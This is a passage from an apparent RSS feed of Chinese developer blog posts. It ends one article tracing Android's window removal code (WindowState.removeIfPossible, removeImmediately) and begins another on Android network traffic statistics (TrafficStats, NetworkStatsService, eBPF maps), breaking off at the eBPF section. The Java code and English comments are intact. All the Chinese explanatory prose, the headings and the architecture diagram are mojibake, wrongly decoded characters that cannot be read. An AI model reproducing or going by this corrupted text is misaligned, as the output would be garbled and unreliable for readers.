    removeIfPossible(<span class="hljs-literal">false</span> <span class="hljs-comment">/*keepVisibleDeadWindow*/</span>);
    immediatelyNotifyBlastSync();
}
</code></pre>
<p>é‡Œé¢æ¥ç€åˆè°ƒç”¨äº†å¸¦å‚æ•°çš„ removeIfPossible() æ–¹æ³•ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">removeIfPossible</span><span class="hljs-params">(<span class="hljs-type">boolean</span> keepVisibleDeadWindow)</span> {
    <span class="hljs-comment">// æ¡ä»¶åˆ¤æ–­è¿‡æ»¤ï¼Œæ»¡è¶³å…¶ä¸­ä¸€ä¸ªæ¡ä»¶å°±ä¼š returnï¼Œæ¨è¿Ÿåˆ é™¤æ“ä½œ</span>
    ...
    removeImmediately(); <span class="hljs-comment">// 1</span>
    <span class="hljs-comment">// Removing a visible window will effect the computed orientation</span>
    <span class="hljs-comment">// So just update orientation if needed.</span>
    <span class="hljs-keyword">if</span> (wasVisible) {
        <span class="hljs-keyword">final</span> <span class="hljs-type">DisplayContent</span> <span class="hljs-variable">displayContent</span> <span class="hljs-operator">=</span> getDisplayContent();
        <span class="hljs-keyword">if</span> (displayContent.updateOrientation()) {
            displayContent.sendNewConfiguration();
        }
    }
    mWmService.updateFocusedWindowLocked(isFocused()
                    ? UPDATE_FOCUS_REMOVING_FOCUS
                    : UPDATE_FOCUS_NORMAL,
            <span class="hljs-literal">true</span> <span class="hljs-comment">/*updateInputWindows*/</span>);
}
</code></pre>
<p>removelfPossible() æ–¹æ³•å’Œå®ƒçš„åå­—ä¸€æ ·ï¼Œå¹¶ä¸æ˜¯ç›´æ¥æ‰§è¡Œåˆ é™¤æ“ä½œçš„ï¼Œè€Œæ˜¯è¿›è¡Œå¤šä¸ªæ¡ä»¶åˆ¤æ–­è¿‡æ»¤ï¼Œæ»¡è¶³å…¶ä¸­ä¸€ä¸ªæ¡ä»¶å°±ä¼š returnï¼Œæ¨è¿Ÿåˆ é™¤æ“ä½œã€‚æ¯”å¦‚ View æ­£åœ¨è¿è¡Œä¸€ä¸ªåŠ¨ç”»è¿™æ—¶å°±å¾—æ¨è¿Ÿåˆ é™¤æ“ä½œï¼Œç›´åˆ°åŠ¨ç”»å®Œæˆã€‚é€šè¿‡è¿™äº›æ¡ä»¶åˆ¤æ–­è¿‡æ»¤å°±ä¼šæ‰§è¡Œæ³¨é‡Š 1 å¤„çš„ removeImmediately() æ–¹æ³•:</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">void</span> <span class="hljs-title function_">removeImmediately</span><span class="hljs-params">()</span> {
    <span class="hljs-built_in">super</span>.removeImmediately();

    <span class="hljs-keyword">if</span> (mRemoved) { <span class="hljs-comment">// 1</span>
        <span class="hljs-comment">// Nothing to do.</span>
        ProtoLog.v(WM_DEBUG_ADD_REMOVE,
                <span class="hljs-string">"WS.removeImmediately: %s Already removed..."</span>, <span class="hljs-built_in">this</span>);
        <span class="hljs-keyword">return</span>;
    }

    mRemoved = <span class="hljs-literal">true</span>; 

    ...
    dc.getDisplayPolicy().removeWindowLw(<span class="hljs-built_in">this</span>); <span class="hljs-comment">// 2</span>

    disposeInputChannel();

    mWinAnimator.destroyDeferredSurfaceLocked();
    mWinAnimator.destroySurfaceLocked();
    mSession.windowRemovedLocked(); <span class="hljs-comment">// 3</span>
    <span class="hljs-keyword">try</span> {
        mClient.asBinder().unlinkToDeath(mDeathRecipient, <span class="hljs-number">0</span>);
    } <span class="hljs-keyword">catch</span> (RuntimeException e) {
        <span class="hljs-comment">// Ignore if it has already been removed (usually because</span>
        <span class="hljs-comment">// we are doing this as part of processing a death note.)</span>
    }

    mWmService.postWindowRemoveCleanupLocked(<span class="hljs-built_in">this</span>); <span class="hljs-comment">// 4</span>
}
</code></pre>
<p>removelmmediately() æ–¹æ³•å¦‚åŒå®ƒçš„åå­—ä¸€æ ·ï¼Œç”¨äºç«‹å³è¿›è¡Œåˆ é™¤æ“ä½œã€‚åœ¨æ³¨é‡Š 1 å¤„çš„ mRemoved ä¸º true æ„å‘³ç€æ­£åœ¨æ‰§è¡Œåˆ é™¤ Window æ“ä½œã€‚åœ¨æ³¨é‡Š 2 å¤„å¦‚æœå½“å‰è¦åˆ é™¤çš„ Window æ˜¯ StatusBar æˆ–è€… NavigationBarï¼Œå°±ä¼šå°†è¿™ä¸ª Window ä»å¯¹åº”çš„æ§åˆ¶å™¨ä¸­åˆ é™¤ã€‚åœ¨æ³¨é‡Š 3 å¤„å°†å¯¹åº”çš„ Session ä» WMS çš„ ArraySet&lt;Session&gt; ç±»å‹çš„å‚æ•° mSessions ä¸­åˆ é™¤å¹¶æ¸…é™¤ Session å¯¹åº”çš„ SurfaceSession èµ„æºï¼ˆSurfaceSession æ˜¯ SurfaceFlinger çš„ä¸€ä¸ªè¿æ¥ï¼Œé€šè¿‡è¿™ä¸ªè¿æ¥å¯ä»¥åˆ›å»º 1 ä¸ªæˆ–è€…å¤šä¸ª Surface å¹¶æ¸²æŸ“åˆ°å±å¹•ä¸Šï¼‰ã€‚åœ¨æ³¨é‡Š 4 å¤„è°ƒç”¨äº† WMS çš„ postWindowRemoveCleanupLocked() æ–¹æ³•ç”¨äºå¯¹ View è¿›è¡Œä¸€äº›é›†ä¸­çš„æ¸…ç†å·¥ä½œã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[androidç½‘ç»œæµé‡ç»Ÿè®¡]]></title>    <link>https://juejin.cn/post/7602965400808849458</link>    <guid>https://juejin.cn/post/7602965400808849458</guid>    <pubDate>2026-02-05T08:38:12.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602965400808849458" data-draft-id="7603160727717576755" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="androidç½‘ç»œæµé‡ç»Ÿè®¡"/> <meta itemprop="keywords" content="Android"/> <meta itemprop="datePublished" content="2026-02-05T08:38:12.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç”¨æˆ·341408199125"/> <meta itemprop="url" content="https://juejin.cn/user/570004686782272"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            androidç½‘ç»œæµé‡ç»Ÿè®¡
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/570004686782272/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç”¨æˆ·341408199125
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T08:38:12.000Z" title="Thu Feb 05 2026 08:38:12 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»10åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ğŸ“Š <strong>Android ç½‘ç»œæµé‡ç»Ÿè®¡æ¶æ„å…¨è§£æ</strong></h2>
<p>Android ç½‘ç»œæµé‡ç»Ÿè®¡æ˜¯ä¸€ä¸ª<strong>å¤šå±‚æ¬¡ã€é«˜åº¦ä¼˜åŒ–</strong>çš„ç³»ç»Ÿï¼Œä»å†…æ ¸å±‚åˆ°åº”ç”¨å±‚æä¾›äº†å®Œæ•´çš„æµé‡ç›‘æ§å’Œç»Ÿè®¡èƒ½åŠ›ã€‚è®©æˆ‘ä¸ºæ‚¨è¯¦ç»†è§£æï¼š</p>
<hr/>
<h2 data-id="heading-1">ğŸ—ï¸ <strong>æ•´ä½“æ¶æ„å›¾</strong></h2>
<pre><code class="hljs language-scss" lang="scss">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                    åº”ç”¨å±‚ (App Layer)                        â”‚
â”‚  - TrafficStats API (ç®€å•æŸ¥è¯¢)                               â”‚
â”‚  - NetworkStatsManager (å†å²æ•°æ®ã€æŒ‰æ—¶é—´æ®µæŸ¥è¯¢)              â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
               â”‚ Binder IPC
               â†“
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚         Framework å±‚ (System Server)                        â”‚
â”‚  - NetworkStatsService                                      â”‚
â”‚    * å‘¨æœŸæ€§è½®è¯¢ (Poll)                                      â”‚
â”‚    * æŒä¹…åŒ–å­˜å‚¨ (NetworkStatsCollection)                    â”‚
â”‚    * æµé‡å‘Šè­¦ (Data Usage Alert)                            â”‚
â”‚  - NetworkStatsFactory (æ•°æ®è§£æ)                           â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
               â”‚ JNI
               â†“
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚           Native å±‚ (libnetworkstats)                       â”‚
â”‚  - BpfNetworkStats<span class="hljs-selector-class">.cpp</span>                                      â”‚
â”‚  - è¯»å– eBPF Map                                            â”‚
â”‚  - è§£æç»Ÿè®¡æ•°æ®                                              â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
               â”‚ eBPF System Calls
               â†“
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚              å†…æ ¸å±‚ (Linux Kernel)                          â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”    â”‚
â”‚  â”‚  eBPF ç¨‹åº (Android <span class="hljs-number">9</span>+, Kernel <span class="hljs-number">4.9</span>+)               â”‚    â”‚
â”‚  â”‚  - cgroupskb/ingress/stats                        â”‚    â”‚
â”‚  â”‚  - cgroupskb/egress/stats                         â”‚    â”‚
â”‚  â”‚  - æŒ‚è½½ç‚¹: /sys/fs/cgroup/                        â”‚    â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜    â”‚
â”‚               â”‚ å†™å…¥                                        â”‚
â”‚               â†“                                            â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”    â”‚
â”‚  â”‚  eBPF Maps (å†…å­˜ä¸­çš„ Hash Table)                   â”‚    â”‚
â”‚  â”‚  - cookie_tag_map    (Socket â†’ UID/Tag)           â”‚    â”‚
â”‚  â”‚  - uid_stats_map     (UID æµé‡ç»Ÿè®¡)               â”‚    â”‚
â”‚  â”‚  - app_uid_stats_map (App æµé‡ç»Ÿè®¡)               â”‚    â”‚
â”‚  â”‚  - iface_stats_map   (ç½‘å¡æµé‡ç»Ÿè®¡)               â”‚    â”‚
â”‚  â”‚  - tag_stats_map     (Tag æµé‡ç»Ÿè®¡)               â”‚    â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜    â”‚
â”‚                                                             â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”    â”‚
â”‚  â”‚  è€æ—§è®¾å¤‡ (Android <span class="hljs-number">8</span>-, Kernel &lt; <span class="hljs-number">4.9</span>)               â”‚    â”‚
â”‚  â”‚  - xt_qtaguid (Netfilter æ¨¡å—)                    â”‚    â”‚
â”‚  â”‚  - /proc/net/xt_qtaguid/stats                     â”‚    â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜    â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
</code></pre>
<hr/>
<h2 data-id="heading-2">1ï¸âƒ£ <strong>åº”ç”¨å±‚ APIï¼šTrafficStats</strong></h2>
<h3 data-id="heading-3"><strong>åŸºæœ¬ç”¨æ³•</strong></h3>
<pre><code class="hljs language-44:82:packages_modules_Connectivity/framework-t/src/android/net/TrafficStats.java" lang="44:82:packages_modules_Connectivity/framework-t/src/android/net/TrafficStats.java">/**
 * Class that provides network traffic statistics. These statistics include
 * bytes transmitted and received and network packets transmitted and received,
 * over all interfaces, over the mobile interface, and on a per-UID basis.
 * &lt;p&gt;
 * These statistics may not be available on all platforms. If the statistics are
 * not supported by this device, {@link #UNSUPPORTED} will be returned.
 * &lt;p&gt;
 * Note that the statistics returned by this class reset and start from zero
 * after every reboot. To access more robust historical network statistics data,
 * use {@link NetworkStatsManager} instead.
 */
public class TrafficStats {
    static {
        System.loadLibrary("framework-connectivity-tiramisu-jni");
    }

    private static final String TAG = TrafficStats.class.getSimpleName();
    /**
     * The return value to indicate that the device does not support the statistic.
     */
    public final static int UNSUPPORTED = -1;

    /** @hide @deprecated use {@code DataUnit} instead to clarify SI-vs-IEC */
    @Deprecated
    public static final long KB_IN_BYTES = 1024;
    /** @hide @deprecated use {@code DataUnit} instead to clarify SI-vs-IEC */
    @Deprecated
    public static final long MB_IN_BYTES = KB_IN_BYTES * 1024;
    /** @hide @deprecated use {@code DataUnit} instead to clarify SI-vs-IEC */
    @Deprecated
    public static final long GB_IN_BYTES = MB_IN_BYTES * 1024;
    /** @hide @deprecated use {@code DataUnit} instead to clarify SI-vs-IEC */
    @Deprecated
    public static final long TB_IN_BYTES = GB_IN_BYTES * 1024;
    /** @hide @deprecated use {@code DataUnit} instead to clarify SI-vs-IEC */
    @Deprecated
    public static final long PB_IN_BYTES = TB_IN_BYTES * 1024;

    /**
     * Special UID value used when collecting {@link NetworkStatsHistory} for
     * removed applications.
     *
     * @hide
     */
    public static final int UID_REMOVED = -4;
</code></pre>
<h3 data-id="heading-4"><strong>æ ¸å¿ƒæ–¹æ³•</strong></h3>
<pre><code class="hljs language-917:967:packages_modules_Connectivity/framework-t/src/android/net/TrafficStats.java" lang="917:967:packages_modules_Connectivity/framework-t/src/android/net/TrafficStats.java">    /**
     * Return number of bytes transmitted by the given UID since device boot.
     * Counts packets across all network interfaces, and always increases
     * monotonically since device boot. Statistics are measured at the network
     * layer, so they include both TCP and UDP usage.
     * &lt;p&gt;
     * Before {@link android.os.Build.VERSION_CODES#JELLY_BEAN_MR2}, this may
     * return {@link #UNSUPPORTED} on devices where statistics aren't available.
     * &lt;p&gt;
     * Starting in {@link android.os.Build.VERSION_CODES#N} this will only
     * report traffic statistics for the calling UID. It will return
     * {@link #UNSUPPORTED} for all other UIDs for privacy reasons. To access
     * historical network statistics belonging to other UIDs, use
     * {@link NetworkStatsManager}.
     *
     * @see android.os.Process#myUid()
     * @see android.content.pm.ApplicationInfo#uid
     */
    public static long getUidTxBytes(int uid) {
        try {
            return getStatsService().getUidStats(uid, TYPE_TX_BYTES);
        } catch (RemoteException e) {
            throw e.rethrowFromSystemServer();
        }
    }

    /**
     * Return number of bytes received by the given UID since device boot.
     * Counts packets across all network interfaces, and always increases
     * monotonically since device boot. Statistics are measured at the network
     * layer, so they include both TCP and UDP usage.
     * &lt;p&gt;
     * Before {@link android.os.Build.VERSION_CODES#JELLY_BEAN_MR2}, this may return
     * {@link #UNSUPPORTED} on devices where statistics aren't available.
     * &lt;p&gt;
     * Starting in {@link android.os.Build.VERSION_CODES#N} this will only
     * report traffic statistics for the calling UID. It will return
     * {@link #UNSUPPORTED} for all other UIDs for privacy reasons. To access
     * historical network statistics belonging to other UIDs, use
     * {@link NetworkStatsManager}.
     *
     * @see android.os.Process#myUid()
     * @see android.content.pm.ApplicationInfo#uid
     */
    public static long getUidRxBytes(int uid) {
        try {
            return getStatsService().getUidStats(uid, TYPE_RX_BYTES);
        } catch (RemoteException e) {
            throw e.rethrowFromSystemServer();
        }
    }
</code></pre>
<p><strong>ç¤ºä¾‹ä»£ç </strong>ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// è·å–å½“å‰ App çš„æµé‡</span>
<span class="hljs-type">long</span> <span class="hljs-variable">txBytes</span> <span class="hljs-operator">=</span> TrafficStats.getUidTxBytes(Process.myUid());
<span class="hljs-type">long</span> <span class="hljs-variable">rxBytes</span> <span class="hljs-operator">=</span> TrafficStats.getUidRxBytes(Process.myUid());

<span class="hljs-comment">// è·å–ç§»åŠ¨ç½‘ç»œæ€»æµé‡</span>
<span class="hljs-type">long</span> <span class="hljs-variable">mobileTx</span> <span class="hljs-operator">=</span> TrafficStats.getMobileTxBytes();
<span class="hljs-type">long</span> <span class="hljs-variable">mobileRx</span> <span class="hljs-operator">=</span> TrafficStats.getMobileRxBytes();

<span class="hljs-comment">// è·å–æ€»æµé‡</span>
<span class="hljs-type">long</span> <span class="hljs-variable">totalTx</span> <span class="hljs-operator">=</span> TrafficStats.getTotalTxBytes();
<span class="hljs-type">long</span> <span class="hljs-variable">totalRx</span> <span class="hljs-operator">=</span> TrafficStats.getTotalRxBytes();
</code></pre>
<hr/>
<h2 data-id="heading-5">2ï¸âƒ£ <strong>System Serverï¼šNetworkStatsService</strong></h2>
<h3 data-id="heading-6"><strong>æ ¸å¿ƒèŒè´£</strong></h3>
<ol>
<li><strong>å‘¨æœŸæ€§è½®è¯¢ï¼ˆPollingï¼‰</strong></li>
<li><strong>æ•°æ®æŒä¹…åŒ–å­˜å‚¨</strong></li>
<li><strong>æµé‡å‘Šè­¦æœºåˆ¶</strong></li>
<li><strong>å¤šç»´åº¦ç»Ÿè®¡ï¼ˆæ¥å£ã€UIDã€Tagã€æ—¶é—´æ®µï¼‰</strong></li>
</ol>
<h3 data-id="heading-7"><strong>è½®è¯¢æœºåˆ¶</strong></h3>
<pre><code class="hljs language-2593:2733:packages_modules_Connectivity/service-t/src/com/android/server/net/NetworkStatsService.java" lang="2593:2733:packages_modules_Connectivity/service-t/src/com/android/server/net/NetworkStatsService.java">    /**
     * Periodic poll operation, reading current statistics and recording into
     * {@link NetworkStatsHistory}.
     */
    @GuardedBy("mStatsLock")
    private void performPollLocked(int flags, @Nullable PollEvent event) {
        if (!mSystemReady) return;
        if (LOGV) Log.v(TAG, "performPollLocked(flags=0x" + Integer.toHexString(flags) + ")");
        Trace.traceBegin(TRACE_TAG_NETWORK, "performPollLocked");

        if (mSupportEventLogger) {
            mEventLogger.logPollEvent(flags, event);
        }

        final boolean persistNetwork = (flags &amp; FLAG_PERSIST_NETWORK) != 0;
        final boolean persistUid = (flags &amp; FLAG_PERSIST_UID) != 0;
        final boolean persistForce = (flags &amp; FLAG_PERSIST_FORCE) != 0;

        performPollFromProvidersLocked();

        // TODO: consider marking "untrusted" times in historical stats
        final long currentTime = mClock.millis();

        try {
</code></pre>
<p><strong>è½®è¯¢è§¦å‘æ¡ä»¶</strong>ï¼š</p>
<ul>
<li>â° <strong>å®šæœŸè½®è¯¢</strong>ï¼šé»˜è®¤ 30 åˆ†é’Ÿ</li>
<li>ğŸ“¡ <strong>ç½‘ç»œçŠ¶æ€å˜åŒ–</strong>ï¼šåˆ‡æ¢ WiFi/ç§»åŠ¨ç½‘ç»œ</li>
<li>ğŸš¨ <strong>æµé‡å‘Šè­¦</strong>ï¼šè¾¾åˆ°é¢„è®¾é˜ˆå€¼</li>
<li>ğŸ“Š <strong>ç³»ç»Ÿäº‹ä»¶</strong>ï¼šå¼€å…³æœºã€UID ç§»é™¤ã€dumpsys å‘½ä»¤</li>
</ul>
<h3 data-id="heading-8"><strong>æ•°æ®å­˜å‚¨ç»“æ„</strong></h3>
<pre><code class="hljs language-python" lang="python">/data/system/netstats/
â”œâ”€â”€ netstats_xt.<span class="hljs-built_in">bin</span>        <span class="hljs-comment"># æ¥å£çº§åˆ«ç»Ÿè®¡ (Interface)</span>
â”œâ”€â”€ netstats_uid.<span class="hljs-built_in">bin</span>       <span class="hljs-comment"># UID çº§åˆ«ç»Ÿè®¡</span>
â””â”€â”€ netstats_uid_tag.<span class="hljs-built_in">bin</span>   <span class="hljs-comment"># UID + Tag ç»Ÿè®¡</span>
</code></pre>
<hr/>
<h2 data-id="heading-9">3ï¸âƒ£ <strong>å†…æ ¸å±‚ï¼šeBPF vs xt_qtaguid</strong></h2>
<h3 data-id="heading-10"><strong>eBPFï¼ˆAndroid 9+ï¼ŒKernel 4.9+ï¼‰</strong></h3>
